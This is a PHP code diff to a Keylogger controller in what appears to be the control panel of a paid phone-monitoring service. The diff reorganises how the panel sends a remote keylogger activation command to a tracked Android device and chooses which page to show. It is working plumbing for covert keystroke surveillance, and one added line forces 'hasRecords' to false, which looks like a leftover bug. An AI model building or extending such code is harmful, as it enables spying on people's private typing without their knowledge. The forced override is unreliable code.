@@ -20,16 +20,23 @@ class Keylogger extends BaseModuleController
 
     public function indexAction()
     {   
+        
+        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
+        $settingsModel = new \Models\Cp\Settings($this->di);
+        $settings = $settingsModel->getDeviceSettings($this->di['devId']);
+        
+        if ($this->getRequest()->hasGet('activate')) {
+            $settingsModel->activateKeylogger($this->di['devId']);
+            $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Keylogger activation command has been successfully sent! Command activation will take up to 20 min.'));
+            $this->redirect($this->di['router']->getRouteUrl('keylogger'));
+        }
+        
         if ($this->view->paid 
                 && $this->di['currentDevice']['os'] === 'android' 
                     && $this->di['currentDevice']['app_version'] >= 11) {
             return $this->withActivation();
         }
 
-        $keyloggerModel = new \Models\Cp\Keylogger($this->di);
-        $settingsModel = new \Models\Cp\Settings($this->di);
-        $settings = $settingsModel->getDeviceSettings($this->di['devId']);
-            
         if ($this->getRequest()->isAjax()) {
             $dataTableRequest = new \System\DataTableRequest($this->di);
 
@@ -76,18 +83,16 @@ class Keylogger extends BaseModuleController
             if ($this->view->paid) {
                 $this->view->serviceKeylogger = $settings['keylogger_enabled'];
                 $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
+                $this->view->hasRecords = false;
             }
 
-            $this->setView('cp/keylogger/index.htm');
+            if(!$this->view->serviceKeylogger and !$this->view->hasRecords) {
+                $this->setView('cp/keylogger/activation.htm'); 
+            } else
+                $this->setView('cp/keylogger/index.htm');
             
         } else {
             
-            if ($this->getRequest()->hasGet('activate')) {
-                $settingsModel->activateKeylogger($this->di['devId']);
-                $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Keylogger activation command has been successfully sent! Command activation will take up to 20 min.'));
-                $this->redirect($this->di['router']->getRouteUrl('keylogger'));
-            }
-
             $this->setView('cp/keylogger/activation.htm');
             
         }
